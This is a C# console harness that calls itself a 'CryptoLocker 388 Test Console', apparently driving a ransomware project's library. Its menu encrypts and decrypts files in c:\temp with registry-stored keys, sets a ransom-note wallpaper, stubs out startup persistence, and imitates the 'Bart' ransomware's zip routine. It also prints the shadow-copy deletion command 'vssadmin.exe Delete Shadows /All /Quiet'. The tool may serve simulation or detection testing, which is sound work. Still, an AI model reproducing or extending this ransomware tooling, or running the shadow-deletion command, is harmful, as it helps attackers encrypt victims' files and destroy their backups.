using System;
using System.Diagnostics;
using CryptoLocker.Logic;

namespace CryptoLocker.ConsoleTester
{
    class Program
    {
        private static Stopwatch timer = new Stopwatch();

        static void Main()
        {
            
            RegistryHelper.EnsureKeysExists();
                                                                                    
            Console.Write("                             ud$$$**$$$$$$$bc.                                  ");
            Console.Write("                          u@**'        4$$$$$$$Nu                               ");
            Console.Write("                        J                ''#$$$$$$r                             ");
            Console.Write("                       @                       $$$$b                            ");
            Console.Write("                     .F                        ^*3$$$                           ");
            Console.Write("                    :% 4                         J$$$N                          ");
            Console.Write("                    $  :F                       :$$$$$                          ");
            Console.Write("                   4F  9                       J$$$$$$$                         ");
            Console.Write("                   4$   k             4$$$$bed$$$$$$$$$                         ");
            Console.Write("                   $$r  'F            $$$$$$$$$$$$$$$$$r                        ");
            Console.Write("                   $$$   b.           $$$$$$$$$$$$$$$$$N                        ");
            Console.Write("                   $$$$$k 3eeed$$b    $$$Euec.'$$$$$$$$$                        ");
            Console.Write("    .@$**N.        $$$$$' $$$$$$F'L $$$$$$$$$$$  $$$$$$$                        ");
            Console.Write("    :$$L  'L       $$$$$ 4$$$$$$  * $$$$$$$$$$F  $$$$$$F         edNc           ");
            Console.Write("   @$$$$N  ^k      $$$$$  3$$$$*%   $F4$$$$$$$   $$$$$'        d'  z$N          ");
            Console.Write("   $$$$$$   ^k     '$$$'   #$$$F   .$  $$$$$c.u@$$$          J'  @$$$$r         ");
            Console.Write("   $$$$$$$b   *u    ^$L            $$  $$$$$$$$$$$$u@       $$  d$$$$$$         ");
            Console.Write("    ^$$$$$$.    'NL   'N. z@*     $$$  $$$$$$$$$$$$$P      $P  d$$$$$$$         ");
            Console.Write("       ^'*$$$$b   '*L   9$E      4$$$  d$$$$$$$$$$$'     d*   J$$$$$r           ");
            Console.Write("            ^$$$$u  '$.  $$$L     '#' d$$$$$$'.@$$    .@$'  z$$$$*'             ");
            Console.Write("              ^$$$$. ^$N.3$$$       4u$$$$$$$ 4$$$  u$*' z$$$'                  ");
            Console.Write("                '*$$$$$$$$ *$b      J$$$$$$$b u$$P $'  d$$P                     ");
            Console.Write("                   #$$$$$$ 4$ 3*$'$*$ $'$'c@@$$$$ .u@$$$P                       ");
            Console.Write("                     '$$$$  ''F~$ $uNr$$$^&J$$$$F $$$$#                         ");
            Console.Write("                       '$$    '$$$bd$.$W$$$$$$$$F $$'                           ");
            Console.Write("                         ?k         ?$$$$$$$$$$$F'*                             ");
            Console.Write("                          9$$bL     z$$$$$$$$$$$F                               ");
            Console.Write("                           $$$$    $$$$$$$$$$$$$                                ");
            Console.Write("                            '#$$c  '$$$$$$$$$'                                  ");
            Console.Write("                             .@'#$$$$$$$$$$$$b                                  ");
            Console.Write("                           z*      $$$$$$$$$$$$N.                               ");
            Console.Write("                         e'      z$$'  #$$$k  '*$$.                             ");
            Console.Write("                     .u*      u@$P'      '#$$c   '$$c                           ");
            Console.Write("              u@$*'''       d$$'            '$$$u  ^*$$b.                       ");
            Console.Write("            :$F           J$P'                ^$$$c   ''$$$$$$bL                ");
            Console.Write("           d$$  ..      @$#                      #$$b         '#$               ");
            Console.Write("           9$$$$$$b   4$$                          ^$$k         '$              ");
            Console.Write("            '$$6''$b u$$                             '$    d$$$$$P              ");
            Console.Write("              '$F $$$$$'                              ^b  ^$$$$b$               ");
            Console.Write("               '$W$$$$'                                'b@$$$$'                 ");
            Console.Write("                                                        ^$$$*                   ");
            Console.Write("                                                                                ");
            Console.Write("                     CryptoLocker 388 Test Console                              ");
            Console.Write("                                                                                ");
            Console.Write("********************************************************************************");
            string input;
            do
            {
                Console.WriteLine();

                Console.WriteLine("Press 1 to persist in startup");
                Console.WriteLine("Press 2 to drop ransom note");
                Console.WriteLine("Press 3 to encrypt files in c:\\temp");
                Console.WriteLine("Press 4 to decrypt files in c:\\temp");
                Console.WriteLine("Press 5 to delete all shadow copies");
                Console.WriteLine("Press A to Bart encrypt test file");
                Console.WriteLine("Press B to Bart decrypt test file");
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine("Press x to quit");
                Console.Write("Enter choice: ");

                input = Console.ReadLine();

                Console.WriteLine();
                timer.Restart();
                
                if (input == "1") { Persist(); }
                if (input == "2") { DropRansomNote(); }
                if (input == "3") { EncryptFiles(); }
                if (input == "4") { DecryptFiles(); }
                if (input == "5") { Console.WriteLine("vssadmin.exe Delete Shadows /All /Quiet");}
                if (input == "a" || input == "A") { BartZip(); }
                if (input == "b" || input == "B") { BartUnzip(); }
                
                timer.Stop();
                Console.WriteLine("Finished in {0}ms", timer.ElapsedMilliseconds);

                Console.WriteLine();
            } while (input != "x");
            
        }

        private static void DropRansomNote()
        {
            Wallpaper.Set(new Uri("https://sathisharthars.files.wordpress.com/2014/12/021e44da5addc20ffe5f09d9ec813f05.jpg"), Wallpaper.Style.Stretched);
        }

        private static void Persist()
        {
            throw new NotImplementedException();
        }

        static void EncryptFiles()
        {
            var pubk = RegistryHelper.GetPublicKey();
            CryptoService.EncryptFiles("c:\\temp", pubk);
        }

        static void DecryptFiles()
        {
            var privk = RegistryHelper.GetPrivateKey();
            CryptoService.DecryptFiles("c:\\temp", privk);
        }
        
        private static void BartZip()
        {
            CryptoService.BartCompress("C:\\temp\\email.eml");
        }

        private static void BartUnzip()
        {
            CryptoService.BartDecompress("C:\\temp\\email.eml.bart.zip");
        }
    }
}
